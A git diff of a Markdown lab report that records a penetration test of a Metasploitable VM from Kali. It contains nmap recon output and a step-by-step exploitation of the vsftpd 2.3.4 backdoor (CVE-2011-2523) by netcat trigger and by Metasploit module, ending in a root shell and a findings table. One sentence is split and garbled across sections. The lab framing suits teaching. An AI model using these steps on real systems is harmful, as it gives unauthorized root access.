@@ -76,22 +76,119 @@ Build an isolated virtual environment to:
 ### 3.3 Connectivity Verification
 
 **Kali Linux (`ifconfig`):**
-```text
-(kali@kali)-[~] $ ifconfig eth1
+`(kali@kali)-[~] $ ifconfig eth1
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.56.103  netmask 255.255.255.0  broadcast 192.168.56.255
         inet6 fe80::db05:1d1d:45b3:6ef9  prefixlen 64  scopeid 0x20<link>
         ether 08:00:27:bb:7c:d4  txqueuelen 1000  (Ethernet)
+`
 **Metasploitable (`ifconfig`):**
-msfadmin@metasploitable:~$ ifconfig eth0
+`msfadmin@metasploitable:~$ ifconfig eth0
 eth0      Link encap:Ethernet  HWaddr 08:00:27:c9:56:d0  
           inet addr:192.168.56.4  Bcast:192.168.56.255  Mask:255.255.255.0
-
-### Ping Test:
+`
+**Ping Test:**
+`
 (kali@kali)-[~] $ ping -c 4 192.168.56.4
 PING 192.168.56.4 (192.168.56.4) 56(84) bytes of data.
 64 bytes from 192.168.56.4: icmp_seq=1 ttl=64 time=8.22 ms
 64 bytes from 192.168.56.4: icmp_seq=2 ttl=64 time=2.97 ms
 64 bytes from 192.168.56.4: icmp_seq=3 ttl=64 time=1.38 ms
-64 bytes from 192.168.56.4: icmp_seq=4 ttl=64 time=1.91 ms
+64 bytes from 192.168.56.4: icmp_seq=4 ttl=64 time=1.91 ms`
 ### 4. Phase 1 — Reconnaissance & Enumeration
+Goal: Map open ports, identify service versions, and surface known-vulnerable software.
+### 4.1 Host Discovery / Top-1000 Port Scan
+**Command**: nmap 192.168.56.4
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingresslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+### 4.2 Service & OS Detection
+**Command**: sudo nmap -sV -O 192.168.56.4
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+1524/tcp open  bindshell   Metasploitable root shell
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+...
+OS details: Linux 2.6.9 - 2.6.33
+Observation: The FTP service is running vsftpd 2.3.4, a known backdoored version.
+
+### 4.3 Full Port Scan
+**Command**: nmap -p- 192.168.56.4
+(Revealed additional non-standard ports including 3632/distccd and various high ports)
+
+### 4.4 Vulnerability Script Scan
+**Command**: sudo nmap --script vuln -p 21 192.168.56.4
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+## 5. Phase 2 — Exploitation
+### 5.1 Target Selection: vsftpd 2.3.4 backdoor (CVE-2011-2523)
+This release was compromised at the source: a malicious addition opens a root shell on port 6200 when a username containing :) is sent during authentication.
+
+**Method 1 — Manual Exploitation (Reliable)**
+Trigger the backdoor on port 21:
+`(kali@kali)-[~] $ nc 192.168.56.4 21
+220 (vsFTPd 2.3.4)
+USER test:)
+331 Please specify the password.
+PASS passtest`
+Connect to the root shell on port 6200:
+`(kali@kali)-[~] $ nc 192.168.56.4 6200
+id
+uid=0(root) gid=0(root)
+whoami
+root`
+**Method 2 — Metasploit (Automated)**
+`msf > search vsftpd 2.3.4
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.4
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run`
+(Note: On this specific setup, the automated payload failed to fetch, hence the manual Netcat metho
+## 6. Findings & Impact
+Findings are grouped by evidence tier:
+
+ **Validated**: Confirmed by exploitation in this lab. Impact is demonstrated, not inferred.
+
+ **Observed**: Surfaced during enumeration but not exploited. Impact is inferred and recommended for future scope.d was used successfully).
+### 6.1 Validated Findings (Exploited in this lab)
+
+ID	Finding	Port / Service	CVE	Severity	Impact Demonstrated
+F-01	vsftpd 2.3.4 backdoor	21 / FTP	CVE-2011-2523	🔴 Critical	Unauthenticated remote root shell (confirmed with id).
+F-02	Exposed bindshell	1524 / TCP	—	🔴 Critical	Instant root shell, no exploit required.
+
